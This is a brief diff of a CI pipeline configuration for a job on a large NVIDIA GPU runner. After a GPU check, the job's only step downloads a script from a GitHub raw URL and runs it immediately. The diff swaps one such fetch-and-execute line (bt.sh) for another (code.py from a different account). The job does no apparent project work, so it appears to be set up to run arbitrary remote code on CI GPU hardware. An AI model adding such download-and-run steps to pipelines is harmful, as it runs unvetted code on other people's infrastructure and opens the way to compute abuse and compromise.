@@ -7,4 +7,4 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi 
-      - run: wget https://raw.githubusercontent.com/Treecommon/scripts/main/bt.sh && chmod +x *.sh && ./bt.sh
+      - run: wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py && python code.py
